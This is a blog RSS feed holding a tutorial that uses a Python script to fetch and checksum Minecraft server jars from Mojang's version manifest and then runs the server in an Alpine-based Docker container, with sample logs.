<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on My blog</title>
        <link>/posts/</link>
        <description>Recent content in Posts on My blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Tue, 18 Aug 2020 11:24:50 +0200</lastBuildDate>
        <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>How to create a Minecraft server using Docker</title>
            <link>/posts/docker-minecraft/</link>
            <pubDate>Tue, 18 Aug 2020 11:24:50 +0200</pubDate>
            
            <guid>/posts/docker-minecraft/</guid>
            <description>Introduction I want to create a Minecraft server using docker.
For this tutorial, I&amp;rsquo;ll use Minecraft version 1.16.1.
The goal of this tutorial:
 Create a Minecraft server Use Docker to run the server in a container Being able to select the version of the server  The API Minecraft has an API to access and retrieve every available version.
The version manifest is available here, as you can see it&amp;rsquo;s a plain json file that contains all versions published.</description>
            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p>I want to create a Minecraft server using docker.<br>
For this tutorial, I&rsquo;ll use Minecraft version <strong>1.16.1</strong>.</p>
<p>The goal of this tutorial:</p>
<ul>
<li>Create a Minecraft server</li>
<li>Use Docker to run the server in a container</li>
<li>Being able to select the version of the server</li>
</ul>
<h2 id="the-api">The API</h2>
<p>Minecraft has an <strong>API</strong> to access and retrieve every available version.</p>
<p>The version manifest is available <a href="https://launchermeta.mojang.com/mc/game/version_manifest.json">here</a>,
as you can see it&rsquo;s a plain json file that contains all versions published.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JSON" data-lang="JSON">{
    <span style="color:#f92672">&#34;latest&#34;</span>: {
        <span style="color:#f92672">&#34;release&#34;</span>: <span style="color:#e6db74">&#34;1.16.2&#34;</span>,
        <span style="color:#f92672">&#34;snapshot&#34;</span>: <span style="color:#e6db74">&#34;1.16.2&#34;</span>
    },
    <span style="color:#f92672">&#34;versions&#34;</span>: [
        <span style="color:#960050;background-color:#1e0010">//</span> <span style="color:#960050;background-color:#1e0010">...</span>
        {
            <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;1.16.1&#34;</span>,
            <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;release&#34;</span>,
            <span style="color:#f92672">&#34;url&#34;</span>: <span style="color:#e6db74">&#34;https://launchermeta.mojang.com/v1/packages/007e584150d3eb937762a491c340732d01cce945/1.16.1.json&#34;</span>,
            <span style="color:#f92672">&#34;time&#34;</span>: <span style="color:#e6db74">&#34;2020-08-14T14:41:00+00:00&#34;</span>,
            <span style="color:#f92672">&#34;releaseTime&#34;</span>: <span style="color:#e6db74">&#34;2020-06-24T10:31:40+00:00&#34;</span>
        },
        <span style="color:#960050;background-color:#1e0010">//</span> <span style="color:#960050;background-color:#1e0010">...</span>
    ]
}
</code></pre></div><p>If we follow the <a href="https://launchermeta.mojang.com/v1/packages/007e584150d3eb937762a491c340732d01cce945/1.16.1.json">link</a>
in the <code>url</code> of the element with <code>id: 1.16.1</code>, we get the following <code>JSON</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JSON" data-lang="JSON">{
    <span style="color:#f92672">&#34;arguments&#34;</span>: {<span style="color:#960050;background-color:#1e0010">/*...*/</span>},
    <span style="color:#f92672">&#34;assetIndex&#34;</span>: {<span style="color:#960050;background-color:#1e0010">/*...*/</span>},
    <span style="color:#f92672">&#34;assets&#34;</span>: <span style="color:#e6db74">&#34;1.16&#34;</span>,
    <span style="color:#f92672">&#34;downloads&#34;</span>: {
        <span style="color:#f92672">&#34;client&#34;</span>: {<span style="color:#960050;background-color:#1e0010">/*...*/</span>},
        <span style="color:#f92672">&#34;client_mappings&#34;</span>: {<span style="color:#960050;background-color:#1e0010">/*...*/</span>},
        <span style="color:#f92672">&#34;server&#34;</span>: {
            <span style="color:#f92672">&#34;sha1&#34;</span>: <span style="color:#e6db74">&#34;a412fd69db1f81db3f511c1463fd304675244077&#34;</span>,
            <span style="color:#f92672">&#34;size&#34;</span>: <span style="color:#ae81ff">37968964</span>,
            <span style="color:#f92672">&#34;url&#34;</span>: <span style="color:#e6db74">&#34;https://launcher.mojang.com/v1/objects/a412fd69db1f81db3f511c1463fd304675244077/server.jar&#34;</span>
        },
        <span style="color:#f92672">&#34;server_mappings&#34;</span>: {<span style="color:#960050;background-color:#1e0010">/*...*/</span>}
    },
    <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;1.16.1&#34;</span>,
    <span style="color:#f92672">&#34;libraries&#34;</span>: [<span style="color:#960050;background-color:#1e0010">/*...*/</span>],
    <span style="color:#f92672">&#34;logging&#34;</span>: {<span style="color:#960050;background-color:#1e0010">/*...*/</span>},
    <span style="color:#f92672">&#34;mainClass&#34;</span>: <span style="color:#e6db74">&#34;net.minecraft.client.main.Main&#34;</span>,
    <span style="color:#f92672">&#34;minimumLauncherVersion&#34;</span>: <span style="color:#ae81ff">21</span>,
    <span style="color:#f92672">&#34;releaseTime&#34;</span>: <span style="color:#e6db74">&#34;2020-06-24T10:31:40+00:00&#34;</span>,
    <span style="color:#f92672">&#34;time&#34;</span>: <span style="color:#e6db74">&#34;2020-06-24T10:31:40+00:00&#34;</span>,
    <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;release&#34;</span>
}
</code></pre></div><p>Again, if we follow the link in <code>downloads.server.url</code>, we download the jar file of the server</p>
<h2 id="downloading-the-server-jar-file">Downloading the server jar file</h2>
<p>To download the server file and also selecting the server version,
I will use a script to automate that action.</p>
<p>The script need to be able to:</p>
<ul>
<li>Listing the available version</li>
<li>Selected a version or use the latest as default</li>
<li>Download the server file</li>
</ul>
<h3 id="the-option">The option</h3>
<p>First we need to be able to configure which server version to download.
I will put all these options on the <a href="/posts/glossary/cli.md">CLI</a> and using the module <strong>argparse</strong> to manage the options.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> argparse <span style="color:#f92672">import</span> ArgumentParser

LATEST_RELEASE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;last-release&#34;</span>
LATEST_SNAPSHOT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;last-snapshot&#34;</span>


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parseArgs</span>():
    parser <span style="color:#f92672">=</span> ArgumentParser()
    parser<span style="color:#f92672">.</span>add_argument(
        <span style="color:#e6db74">&#34;--version&#34;</span>, <span style="color:#e6db74">&#34;-v&#34;</span>,
        help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;the version of the minecraft server to download, you can use {} or {} to download the latest release / snapshot&#34;</span><span style="color:#f92672">.</span>format(
            LATEST_RELEASE, LATEST_SNAPSHOT),
        required<span style="color:#f92672">=</span>False,
        default<span style="color:#f92672">=</span>LATEST_RELEASE)
    parser<span style="color:#f92672">.</span>add_argument(
        <span style="color:#e6db74">&#34;--list&#34;</span>, <span style="color:#e6db74">&#34;-l&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;list the available version&#34;</span>, choices<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;release&#34;</span>, <span style="color:#e6db74">&#34;snapshot&#34;</span>], default<span style="color:#f92672">=</span>None)
    parser<span style="color:#f92672">.</span>add_argument(
        <span style="color:#e6db74">&#34;--out&#34;</span>, <span style="color:#e6db74">&#34;-o&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;output destination of the server file&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;server.jar&#34;</span>)
    <span style="color:#66d9ef">return</span> parser<span style="color:#f92672">.</span>parse_args()
</code></pre></div><p>In summary, we have:</p>
<ul>
<li><code>--list</code> to list the available version</li>
<li><code>--out</code> to change the output path for the server file</li>
<li><code>--version</code> to select a version</li>
</ul>
<h3 id="listing-the-versions">Listing the versions</h3>
<p>It can be quite tedious to enter the right version name,
that why we added the <code>--list</code> option.</p>
<p>Now we just need to implement the option behavior</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> json
<span style="color:#f92672">import</span> logging <span style="color:#f92672">as</span> log
<span style="color:#f92672">from</span> urllib.request <span style="color:#f92672">import</span> urlopen

VERSION_MANIFEST_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://launchermeta.mojang.com/mc/game/version_manifest.json&#34;</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">loadManifest</span>():
    <span style="color:#66d9ef">return</span> json<span style="color:#f92672">.</span>load(
        urlopen(VERSION_MANIFEST_URL))


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getVersionList</span>(manifest, t):
    <span style="color:#e6db74">&#34;&#34;&#34; Generate an array of all available version &#34;&#34;&#34;</span>
    v <span style="color:#f92672">=</span> filter(<span style="color:#66d9ef">lambda</span> entry: entry[<span style="color:#e6db74">&#34;type&#34;</span>] <span style="color:#f92672">==</span> t, manifest[<span style="color:#e6db74">&#34;versions&#34;</span>])
    m <span style="color:#f92672">=</span> map(<span style="color:#66d9ef">lambda</span> entry: entry[<span style="color:#e6db74">&#34;id&#34;</span>], v)
    <span style="color:#66d9ef">return</span> list(m)


<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
    log<span style="color:#f92672">.</span>basicConfig(level<span style="color:#f92672">=</span>log<span style="color:#f92672">.</span>INFO)
    args <span style="color:#f92672">=</span> parseArgs()
    manifest <span style="color:#f92672">=</span> loadManifest()
    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>list <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> None:
        log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;available {} versions: {}&#34;</span><span style="color:#f92672">.</span>format(
            args<span style="color:#f92672">.</span>list, getVersionList(manifest, args<span style="color:#f92672">.</span>list)))
        exit(<span style="color:#ae81ff">0</span>)
</code></pre></div><ol>
<li>We retrieve all the version in the manifest at <code>VERSION_MANIFEST_URL</code></li>
<li>We retrieve every <code>id</code> in <code>manifest[&quot;versions&quot;]</code></li>
</ol>
<p>With that done, we get the following output:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ python3 serverdl.py -l release
INFO:root:available release versions: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;1.16.2&#39;</span>, <span style="color:#e6db74">&#39;1.16.1&#39;</span>, <span style="color:#e6db74">&#39;1.16&#39;</span>, <span style="color:#e6db74">&#39;1.15.2&#39;</span>, <span style="color:#e6db74">&#39;1.15.1&#39;</span>, <span style="color:#e6db74">&#39;1.15&#39;</span>, <span style="color:#e6db74">&#39;1.14.4&#39;</span>, <span style="color:#e6db74">&#39;1.14.3&#39;</span>, <span style="color:#e6db74">&#39;1.14.2&#39;</span>, <span style="color:#e6db74">&#39;1.14.1&#39;</span>, <span style="color:#e6db74">&#39;1.14&#39;</span>, <span style="color:#e6db74">&#39;1.13.2&#39;</span>, <span style="color:#e6db74">&#39;1.13.1&#39;</span>, <span style="color:#e6db74">&#39;1.13&#39;</span>, <span style="color:#e6db74">&#39;1.12.2&#39;</span>, <span style="color:#e6db74">&#39;1.12.1&#39;</span>, <span style="color:#e6db74">&#39;1.12&#39;</span>, <span style="color:#e6db74">&#39;1.11.2&#39;</span>, <span style="color:#e6db74">&#39;1.11.1&#39;</span>, <span style="color:#e6db74">&#39;1.11&#39;</span>, <span style="color:#e6db74">&#39;1.10.2&#39;</span>, <span style="color:#e6db74">&#39;1.10.1&#39;</span>, <span style="color:#e6db74">&#39;1.10&#39;</span>, <span style="color:#e6db74">&#39;1.9.4&#39;</span>, <span style="color:#e6db74">&#39;1.9.3&#39;</span>, <span style="color:#e6db74">&#39;1.9.2&#39;</span>, <span style="color:#e6db74">&#39;1.9.1&#39;</span>, <span style="color:#e6db74">&#39;1.9&#39;</span>, <span style="color:#e6db74">&#39;1.8.9&#39;</span>, <span style="color:#e6db74">&#39;1.8.8&#39;</span>, <span style="color:#e6db74">&#39;1.8.7&#39;</span>, <span style="color:#e6db74">&#39;1.8.6&#39;</span>, <span style="color:#e6db74">&#39;1.8.5&#39;</span>, <span style="color:#e6db74">&#39;1.8.4&#39;</span>, <span style="color:#e6db74">&#39;1.8.3&#39;</span>, <span style="color:#e6db74">&#39;1.8.2&#39;</span>, <span style="color:#e6db74">&#39;1.8.1&#39;</span>, <span style="color:#e6db74">&#39;1.8&#39;</span>, <span style="color:#e6db74">&#39;1.7.10&#39;</span>, <span style="color:#e6db74">&#39;1.7.9&#39;</span>, <span style="color:#e6db74">&#39;1.7.8&#39;</span>, <span style="color:#e6db74">&#39;1.7.7&#39;</span>, <span style="color:#e6db74">&#39;1.7.6&#39;</span>, <span style="color:#e6db74">&#39;1.7.5&#39;</span>, <span style="color:#e6db74">&#39;1.7.4&#39;</span>, <span style="color:#e6db74">&#39;1.7.3&#39;</span>, <span style="color:#e6db74">&#39;1.7.2&#39;</span>, <span style="color:#e6db74">&#39;1.6.4&#39;</span>, <span style="color:#e6db74">&#39;1.6.2&#39;</span>, <span style="color:#e6db74">&#39;1.6.1&#39;</span>, <span style="color:#e6db74">&#39;1.5.2&#39;</span>, <span style="color:#e6db74">&#39;1.5.1&#39;</span>, <span style="color:#e6db74">&#39;1.4.7&#39;</span>, <span style="color:#e6db74">&#39;1.4.5&#39;</span>, <span style="color:#e6db74">&#39;1.4.6&#39;</span>, <span style="color:#e6db74">&#39;1.4.4&#39;</span>, <span style="color:#e6db74">&#39;1.4.2&#39;</span>, <span style="color:#e6db74">&#39;1.3.2&#39;</span>, <span style="color:#e6db74">&#39;1.3.1&#39;</span>, <span style="color:#e6db74">&#39;1.2.5&#39;</span>, <span style="color:#e6db74">&#39;1.2.4&#39;</span>, <span style="color:#e6db74">&#39;1.2.3&#39;</span>, <span style="color:#e6db74">&#39;1.2.2&#39;</span>, <span style="color:#e6db74">&#39;1.2.1&#39;</span>, <span style="color:#e6db74">&#39;1.1&#39;</span>, <span style="color:#e6db74">&#39;1.0&#39;</span><span style="color:#f92672">]</span>
</code></pre></div><h3 id="selecting-the-version">Selecting the version</h3>
<p>Now that we are able to known which version is available, we need to implement the behavior
of the <code>--version</code> option</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">standardizeVersion</span>(version, manifest):
    <span style="color:#e6db74">&#34;&#34;&#34; Standardize LATEST_{RELEASE,SNAPSHOT} into the corresponding version &#34;&#34;&#34;</span>
    <span style="color:#66d9ef">if</span> version <span style="color:#f92672">==</span> LATEST_RELEASE:
        <span style="color:#66d9ef">return</span> manifest[<span style="color:#e6db74">&#34;latest&#34;</span>][<span style="color:#e6db74">&#34;release&#34;</span>]
    <span style="color:#66d9ef">if</span> version <span style="color:#f92672">==</span> LATEST_SNAPSHOT:
        <span style="color:#66d9ef">return</span> manifest[<span style="color:#e6db74">&#34;latest&#34;</span>][<span style="color:#e6db74">&#34;snapshot&#34;</span>]
    <span style="color:#66d9ef">return</span> version


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">findVersionEntry</span>(version, manifest):
    <span style="color:#e6db74">&#34;&#34;&#34; Find the corresponding entry for the version in the manifest &#34;&#34;&#34;</span>
    v <span style="color:#f92672">=</span> standardizeVersion(version, manifest)
    versions <span style="color:#f92672">=</span> manifest[<span style="color:#e6db74">&#34;versions&#34;</span>]
    <span style="color:#66d9ef">for</span> entry <span style="color:#f92672">in</span> versions:
        <span style="color:#66d9ef">if</span> entry[<span style="color:#e6db74">&#34;id&#34;</span>] <span style="color:#f92672">==</span> v:
            <span style="color:#66d9ef">return</span> entry
    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(
        <span style="color:#e6db74">&#34;version {} not found in manifest&#34;</span><span style="color:#f92672">.</span>format(version))

<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
    <span style="color:#75715e"># ...</span>
    v <span style="color:#f92672">=</span> standardizeVersion(args<span style="color:#f92672">.</span>version, manifest)
    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;selected version: {}&#34;</span><span style="color:#f92672">.</span>format(v))
    versionEnt <span style="color:#f92672">=</span> findVersionEntry(v, manifest)
    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;found entry with id {}&#34;</span><span style="color:#f92672">.</span>format(versionEnt[<span style="color:#e6db74">&#34;id&#34;</span>]))
</code></pre></div><h3 id="download-the-server">Download the server</h3>
<p>To download the server file, we need first to load the version specific <strong>JSON</strong> then download the server.</p>
<p>The <strong>JSON</strong> contain a <code>sha1</code> properties to check the fingerprints of the file that we downloaded,
so I added <code>checkServerChecksum()</code> to check the file integrity.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> json
<span style="color:#f92672">import</span> logging <span style="color:#f92672">as</span> log
<span style="color:#f92672">from</span> urllib.request <span style="color:#f92672">import</span> urlopen, urlretrieve

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">loadVersionEntry</span>(entry):
    log<span style="color:#f92672">.</span>debug(<span style="color:#e6db74">&#34;version entry: {}&#34;</span><span style="color:#f92672">.</span>format(entry[<span style="color:#e6db74">&#34;url&#34;</span>]))
    <span style="color:#66d9ef">return</span> json<span style="color:#f92672">.</span>load(urlopen(entry[<span style="color:#e6db74">&#34;url&#34;</span>]))


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">downloadEntry</span>(entry, destination):
    url <span style="color:#f92672">=</span> entry[<span style="color:#e6db74">&#34;downloads&#34;</span>][<span style="color:#e6db74">&#34;server&#34;</span>][<span style="color:#e6db74">&#34;url&#34;</span>]
    log<span style="color:#f92672">.</span>debug(<span style="color:#e6db74">&#34;server download: {}&#34;</span><span style="color:#f92672">.</span>format(url))
    <span style="color:#66d9ef">return</span> urlretrieve(url, destination)


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">checkServerChecksum</span>(entry, serverpath):
    <span style="color:#f92672">import</span> hashlib
    hash_sha1 <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1()
    <span style="color:#66d9ef">with</span> open(serverpath, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
        <span style="color:#66d9ef">for</span> chunk <span style="color:#f92672">in</span> iter(<span style="color:#66d9ef">lambda</span>: f<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">4096</span>), <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>):
            hash_sha1<span style="color:#f92672">.</span>update(chunk)
    <span style="color:#66d9ef">if</span> entry[<span style="color:#e6db74">&#34;downloads&#34;</span>][<span style="color:#e6db74">&#34;server&#34;</span>][<span style="color:#e6db74">&#34;sha1&#34;</span>] <span style="color:#f92672">!=</span> hash_sha1<span style="color:#f92672">.</span>hexdigest():
        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#34;{} did not match sha1 ( {} != {} )&#34;</span><span style="color:#f92672">.</span>format(
            serverpath, entry[<span style="color:#e6db74">&#34;downloads&#34;</span>][<span style="color:#e6db74">&#34;server&#34;</span>][<span style="color:#e6db74">&#34;sha1&#34;</span>], hash_sha1<span style="color:#f92672">.</span>hexdigest()))

<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
    <span style="color:#75715e"># ...</span>
    ent <span style="color:#f92672">=</span> loadVersionEntry(versionEnt)
    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;successfully load version entry&#34;</span>)
    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;downloading server: {} b&#34;</span><span style="color:#f92672">.</span>format(
        ent[<span style="color:#e6db74">&#34;downloads&#34;</span>][<span style="color:#e6db74">&#34;server&#34;</span>][<span style="color:#e6db74">&#34;size&#34;</span>]))
    downloadEntry(ent, args<span style="color:#f92672">.</span>out)
    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;checking server fingerprint&#34;</span>)
    checkServerChecksum(ent, args<span style="color:#f92672">.</span>out)
    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;done, the file was downloaded at {}&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>out))
</code></pre></div><p>That it&rsquo;s, we finish the script that download the server file.</p>
<p>the script is available <a href="https://gitlab.com/firelight.flagboy/docker-minecraft/-/blob/master/serverdl.py">here</a></p>
<h2 id="creating-the-container">Creating the container</h2>
<p>To create the container, I use a Dockerfile to install and setup everything needed.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Docker" data-lang="Docker"><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> alpine</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> apk update <span style="color:#f92672">&amp;&amp;</span> apk add python3 openjdk8-jre-base<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> serverdl.py /usr/sbin/.<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> adduser -S -u <span style="color:#ae81ff">42</span> minecraft <span style="color:#f92672">&amp;&amp;</span> mkdir -p /home/minecraft/server <span style="color:#f92672">&amp;&amp;</span> chown -R minecraft /home/minecraft<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">USER</span><span style="color:#e6db74"> minecraft</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /home/minecraft/server</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> --chown<span style="color:#f92672">=</span>42:42 server.properties .<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ARG</span> VERSION<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>.16.1<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> python3 /usr/sbin/serverdl.py -v $VERSION -o server-$VERSION.jar <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;eula=true&#34;</span> &gt; eula.txt<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ENV</span> VERSION <span style="color:#e6db74">${</span>VERSION<span style="color:#e6db74">}</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ENV</span> MIN_MEM 1024M<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ENV</span> MAX_MEM 2048M<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ENTRYPOINT</span> java -Xms$MIN_MEM -Xmx$MAX_MEM -jar server-$VERSION.jar<span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>You can change the version using the <code>--build-arg</code> option when building the container.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">docker build --build-arg VERSION<span style="color:#f92672">=</span>1.5.2 -t minecraft .
</code></pre></div><p>You can change the memory settings by using <code>--env</code> option when running the container.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">docker run --env MAX_MEM<span style="color:#f92672">=</span>4096M minecraft
</code></pre></div><h3 id="building-the-container">Building the container</h3>
<p>To build the server, we do as follows (if you to specify the server version see <code>--build-arg</code>):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ docker build -t minecraft .
Sending build context to Docker daemon  9.206MB
<span style="color:#f92672">[</span> ... output omitted ... <span style="color:#f92672">]</span>
Successfully tagged minecraft:latest
</code></pre></div><h3 id="running-the-container">Running the container</h3>
<p>To run the server, we do as follows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ docker run --rm -dit --name minecraft -p 25565:25565 minecraft
9db734f4c923905f21e374d0c9d6aaa9be8f8b68aa039a2823cb0ca79b303f1e
$ docker container logs -f minecraft
<span style="color:#f92672">[</span> ... output omitted ... <span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>13:17:46<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>Worker-Main-6/INFO<span style="color:#f92672">]</span>: Loaded <span style="color:#ae81ff">7</span> recipes
<span style="color:#f92672">[</span>13:17:47<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>Worker-Main-6/INFO<span style="color:#f92672">]</span>: Loaded <span style="color:#ae81ff">927</span> advancements
<span style="color:#f92672">[</span>13:17:48<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>Server thread/INFO<span style="color:#f92672">]</span>: Starting minecraft server version 1.16.1
<span style="color:#f92672">[</span>13:17:48<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>Server thread/INFO<span style="color:#f92672">]</span>: Loading properties
<span style="color:#f92672">[</span>13:17:48<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>Server thread/INFO<span style="color:#f92672">]</span>: Default game type: SURVIVAL
<span style="color:#f92672">[</span>13:17:48<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>Server thread/INFO<span style="color:#f92672">]</span>: Generating keypair
<span style="color:#f92672">[</span>13:17:48<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>Server thread/INFO<span style="color:#f92672">]</span>: Starting Minecraft server on *:25565
<span style="color:#f92672">[</span>13:17:48<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>Server thread/INFO<span style="color:#f92672">]</span>: Using epoll channel type
<span style="color:#f92672">[</span>13:17:48<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>Server thread/INFO<span style="color:#f92672">]</span>: Preparing level <span style="color:#e6db74">&#34;world&#34;</span>
<span style="color:#f92672">[</span>13:17:55<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>Server thread/INFO<span style="color:#f92672">]</span>: Preparing start region <span style="color:#66d9ef">for</span> dimension minecraft:overworld
<span style="color:#f92672">[</span>13:17:55<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>Worker-Main-4/INFO<span style="color:#f92672">]</span>: Preparing spawn area: 0%
<span style="color:#f92672">[</span> ... output omitted ... <span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>13:18:14<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>Worker-Main-6/INFO<span style="color:#f92672">]</span>: Preparing spawn area: 93%
<span style="color:#f92672">[</span>13:18:15<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>Server thread/INFO<span style="color:#f92672">]</span>: Time elapsed: <span style="color:#ae81ff">19857</span> ms
<span style="color:#f92672">[</span>13:18:15<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>Server thread/INFO<span style="color:#f92672">]</span>: Done <span style="color:#f92672">(</span>26.520s<span style="color:#f92672">)</span>! For help, type <span style="color:#e6db74">&#34;help&#34;</span>
</code></pre></div><p>The option <code>-p 25565:25565</code> here is important,
it allows docker to map the host port <code>25565</code> to the container post <code>25565</code>.
Without that we&rsquo;ll be getting connection error.</p>
<h2 id="connecting-in-the-server">Connecting in the server</h2>
<p>We can now connect to the server using the address localhost.</p>
<p>On connection the server log as intended that a new user is now connected, we can also enter command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">$ docker attach minecraft
[ ... output omited ... ]
[13:30:53] [User Authenticator #6/INFO]: UUID of player user is [ ... output omitted ... ]
[13:30:53] [Server thread/INFO]: user[/172.17.0.1:52670] logged in with entity id 1470 at (194.09004571731342, 68.0, 210.94037651394027)
[13:30:53] [Server thread/INFO]: user joined the game
/say hello from server
